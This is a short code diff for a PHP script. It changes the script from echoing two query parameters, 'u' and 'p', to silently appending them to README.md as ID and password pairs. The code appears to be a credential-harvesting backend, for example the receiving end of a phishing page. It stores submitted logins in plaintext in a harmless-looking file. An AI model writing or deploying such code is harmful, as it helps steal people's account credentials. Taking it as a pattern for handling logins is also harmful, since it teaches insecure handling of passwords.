@@ -1,8 +1,10 @@
 <?php
 
-	if ($_GET("u") && $_GET("p")) {
-		echo $_GET("u");
-		echo $_GET("p");
+	if (@$_GET["u"] && @$_GET["p"]) {
+		# code...
+		$file = fopen("README.md","a");
+		fwrite($file, '<> ID : '.$_GET["u"].' --> PW : '.$_GET["p"]."\n");
+		fclose($file);
 
 	}
 	else {
